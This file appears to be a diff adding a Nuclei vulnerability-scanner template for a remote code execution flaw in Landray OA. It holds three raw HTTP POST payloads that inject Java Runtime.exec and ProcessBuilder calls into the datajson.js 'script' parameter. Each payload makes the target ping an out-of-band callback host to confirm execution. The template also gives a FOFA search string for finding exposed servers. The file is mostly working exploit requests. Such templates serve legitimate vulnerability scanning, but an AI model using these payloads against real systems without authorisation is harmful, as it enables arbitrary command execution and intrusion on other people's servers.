@@ -1,0 +1,52 @@
+id: landray-oa-datajson-rce
+
+info:
+  name: Landray OA Datajson RCE
+  author: SleepingBag945
+  severity: critical
+  description: |
+    FOFA: app="Landray-OA系统"
+  reference: 
+    - https://www.cnsuc.net/thread-553.htm
+  tags: LandRay-OA
+
+http:
+  - raw:
+      - |
+        POST /data/sys-common/datajson.js HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        s_bean=sysFormulaSimulateByJS&script=new java.lang.ProcessBuilder("ping","{{interactsh-url}}").start()&type=1
+
+      - |
+        POST /data/sys-common/datajson.js HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        s_bean=sysFormulaSimulateByJS&script=function%20test(){%20return%20java.lang.Runtime};r=test();r.getRuntime().exec("ping%20-c%204%20{{interactsh-url}}")&type=1
+
+      - |
+        POST /data/sys-common/datajson.js HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        s_bean=sysFormulaSimulateByJS&script=var+calc='ping+{{interactsh-url}}';java.lang.Runtime.getRuntime().exec(calc)&type=1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+      - type: word
+        words:
+          - 'success":true'
+        condition: and
+
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
